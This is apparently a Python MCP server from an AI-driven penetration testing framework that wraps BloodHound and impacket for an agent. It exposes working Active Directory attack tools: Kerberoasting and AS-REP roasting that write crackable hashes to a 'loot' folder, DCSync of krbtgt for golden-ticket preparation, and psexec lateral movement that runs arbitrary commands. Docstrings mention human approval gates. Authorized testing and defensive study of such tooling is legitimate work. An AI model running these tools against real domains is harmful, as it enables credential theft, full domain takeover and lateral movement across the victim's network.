"""AD specialist MCP server — BloodHound + impacket wrappers.

Phase 4: AD only gets its own subagent when BloodHound output
volume justifies the split. This server exposes the high-leverage AD
primitives: ingest BloodHound data, query for the most common ACL/group
attack paths, kerberoast, ASREProast, DCSync.

The destructive operations (DCSync, lateral) are classified as
CREDENTIAL_DUMP and LATERAL_MOVEMENT in `action_class.py` so engagement-mode
HITL covers them.
"""

from __future__ import annotations

import asyncio
import os
from typing import Any

from mcp.server.fastmcp import FastMCP

app = FastMCP(
    "ad",
    host=os.environ.get("HOST", "0.0.0.0"),
    port=int(os.environ.get("PORT", "8080")),
)


async def _exec(cmd: list[str], stdin: bytes | None = None, timeout_s: int = 300) -> dict[str, Any]:
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdin=asyncio.subprocess.PIPE if stdin is not None else None,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(stdin), timeout=timeout_s)
    except TimeoutError:
        proc.kill()
        return {"ok": False, "error": "timeout"}
    return {
        "ok": proc.returncode == 0,
        "rc": proc.returncode,
        "stdout": stdout.decode(errors="replace"),
        "stderr": stderr.decode(errors="replace"),
    }


@app.tool()
async def bloodhound_collect(
    domain: str,
    user: str,
    password: str,
    dc: str,
    output_dir: str = "/engagement/bloodhound",
) -> dict[str, Any]:
    """Run bloodhound-python to collect AD data. Outputs JSON files for ingest.

    HIGH-VOLUME output — this is why AD gets its own subagent. The orchestrator
    should not stream the raw JSON; the analyst queries via `bloodhound_query`.
    """
    cmd = [
        "bloodhound-python",
        "-d", domain,
        "-u", user, "-p", password,
        "-ns", dc,
        "-c", "All",
        "--zip",
    ]
    res = await _exec(cmd, timeout_s=600)
    return {
        "ok": res["ok"],
        "output_dir": output_dir,
        "stdout_tail": res["stdout"][-2000:],
        "stderr_tail": res["stderr"][-2000:],
    }


@app.tool()
async def bloodhound_query(query: str, neo4j_uri: str | None = None) -> dict[str, Any]:
    """Run a Cypher query against the local BloodHound Neo4j.

    The orchestrator should use the high-leverage queries from the
    `ad-attack-paths` skill — `Find shortest path to Domain Admins`, etc.
    """
    try:
        from neo4j import AsyncGraphDatabase  # type: ignore
    except ImportError:
        return {"ok": False, "error": "neo4j driver not available"}

    uri = neo4j_uri or os.environ.get("BLOODHOUND_NEO4J_URI", "bolt://neo4j:7687")
    user = os.environ.get("NEO4J_USER", "neo4j")
    password = os.environ.get("NEO4J_PASSWORD", "changeme")

    driver = AsyncGraphDatabase.driver(uri, auth=(user, password))
    try:
        async with driver.session() as session:
            result = await session.run(query)
            rows = [r.data() async for r in result]
    finally:
        await driver.close()
    return {"ok": True, "rows": rows[:200], "truncated": len(rows) > 200}


@app.tool()
async def kerberoast(
    domain: str,
    user: str,
    password: str,
    dc: str,
    output_path: str = "/engagement/loot/kerberoast.txt",
) -> dict[str, Any]:
    """Request SPN tickets and write hashes for offline cracking.

    Classified as CREDENTIAL_DUMP — engagement-mode HITL applies.
    """
    cmd = [
        "impacket-GetUserSPNs",
        f"{domain}/{user}:{password}",
        "-dc-ip", dc,
        "-request",
        "-outputfile", output_path,
    ]
    res = await _exec(cmd, timeout_s=120)
    hashes = []
    try:
        from pathlib import Path
        if Path(output_path).exists():
            hashes = [line.strip() for line in Path(output_path).read_text().splitlines() if "$krb5tgs$" in line]
    except OSError:
        pass
    return {"ok": res["ok"], "hash_count": len(hashes), "stderr_tail": res["stderr"][-1000:]}


@app.tool()
async def asreproast(
    domain: str,
    dc: str,
    user_list_path: str = "/engagement/users.txt",
    output_path: str = "/engagement/loot/asreproast.txt",
) -> dict[str, Any]:
    """ASREProast against accounts with DONT_REQ_PREAUTH set.

    Doesn't require valid creds — only a user list. Output is offline-crackable
    hashes.
    """
    cmd = [
        "impacket-GetNPUsers",
        f"{domain}/", "-no-pass",
        "-usersfile", user_list_path,
        "-dc-ip", dc,
        "-outputfile", output_path,
    ]
    res = await _exec(cmd, timeout_s=120)
    return {"ok": res["ok"], "stderr_tail": res["stderr"][-1000:]}


@app.tool()
async def dcsync(
    domain: str,
    user: str,
    password: str,
    dc: str,
    target_user: str = "krbtgt",
) -> dict[str, Any]:
    """DCSync a specific account (default krbtgt for golden-ticket prep).

    Requires DA-equivalent rights. CREDENTIAL_DUMP — HITL approval in engagement.
    """
    cmd = [
        "impacket-secretsdump",
        f"{domain}/{user}:{password}@{dc}",
        "-just-dc-user", target_user,
    ]
    res = await _exec(cmd, timeout_s=120)
    return {"ok": res["ok"], "stdout": res["stdout"][:4000], "stderr": res["stderr"][:2000]}


@app.tool()
async def pivot_via_psexec(
    domain: str,
    user: str,
    password: str,
    target_host: str,
    command: str | None = None,
) -> dict[str, Any]:
    """Lateral movement via impacket-psexec. Classified as LATERAL_MOVEMENT.

    Lab-mode HITL pauses here; engagement-mode requires per-call approval.
    """
    creds = f"{domain}/{user}:{password}" if domain else f"{user}:{password}"
    cmd = ["impacket-psexec", f"{creds}@{target_host}"]
    if command:
        cmd.append(command)
    res = await _exec(cmd, timeout_s=120)
    return {
        "ok": res["ok"],
        "stdout": res["stdout"][:4000],
        "stderr": res["stderr"][:2000],
    }


def main() -> None:
    app.run(transport="streamable-http")


if __name__ == "__main__":
    main()
